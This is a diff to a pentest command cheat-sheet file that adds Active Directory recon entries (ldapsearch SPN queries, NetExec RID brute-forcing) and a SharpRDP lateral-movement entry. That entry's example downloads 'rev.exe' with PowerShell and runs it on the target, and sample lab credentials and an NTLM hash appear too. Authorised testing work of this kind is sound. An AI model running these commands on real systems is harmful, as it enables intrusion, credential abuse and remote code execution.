@@ -459,6 +459,17 @@ examples = [
     "ldapdomaindump -u 'CORP.local/user' -p 'ba0ecf3dcda348e7a91e548719c3ac6e:12943dbced43cd06a0445dd11fac3a7d' -at NTLM ldap://127.0.0.1"
 ]
 
+[command.LDAPSearch]
+use_name = "ldapsearch"
+local = false
+cmd_types = "pentest|recon"
+short_desc = "LDAP Enumeration using Kerberos (-Y GSSAPI)"
+args = "ldapsearch -Y GSSAPI -H ldap://<URI|dc01.domain.corp> -D '<binddn>' -W -b '<basedn>' 'servicePrincipalName=<spn|*>' servicePrincipalName"
+examples = [
+    "ldapsearch -Y GSSAPI -H ldap://dc01.corp1.com -D 'Administrator@DOMAIN.CORP' -W -b 'dc=corp1,dc=com' 'servicePrincipalName=*' servicePrincipalName"
+]
+
+
 [command.CrackMapExec]
 use_name = "cme"
 local = false
@@ -472,12 +483,23 @@ examples = [
 [command.NetExec]
 use_name = "nxc"
 local = false
-cmd_types = "pentest"
+cmd_types = "pentest|recon"
 short_desc = "Show access on list of machines"
 args = "nxc smb <ipsfile|ips.txt> -u <username> -p <password|password>"
 examples = [
     "nxc smb ips.txt -u user -p 'password' -d corp.com"
 ]
+
+[command.NetExec2]
+use_name = "nxc"
+local = false
+cmd_types = "pentest|recon"
+short_desc = "List users on machine"
+args = "nxc <protocol|smb> -u <username> -p <password|password> <hostname|127.0.0.1> --rid-brute"
+examples = [
+    "nxc mssql 127.0.0.1 -u kevin -p 'pass' --rid-brute"
+]
+
 
 [command.SMBClient-0]
 use_name = "smbclient"
@@ -587,6 +609,17 @@ args = ".\\PsExec64.exe -i  \\\\<machine|127.0.0.1> -u <username|corp\\jen> -p <
 examples = [
     ".\\PsExec64.exe -i  \\\\FILES04 -u corp\\jen -p Nexus123! cmd"
 ]
+
+[command.SharpRDP]
+use_name = "SharpRDP"
+local = false
+cmd_types = "lateralization|windows"
+short_desc = "SharpRDP Lateralization with DL and reverse connect"
+args = ".\\SharpRDP.exe computername=<target-hostname> username=<domain\\user> password=<password> command=\"powershell (New-Object System.Net.WebClient).DownloadFile('<URI>', '<save-path>'); <again-save-path>\""
+examples = [
+    ".\\SharpRDP.exe computername=appsrv01 username=corp1\\dave password=lab command=\"powershell (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/rev.exe', 'C:\\Windows\\Tasks\\rev.exe'); C:\\Windows\\Tasks\\rev.exe\""
+]
+
 
 # ===== REVERSE COMMANDS =====
 # ============================ #
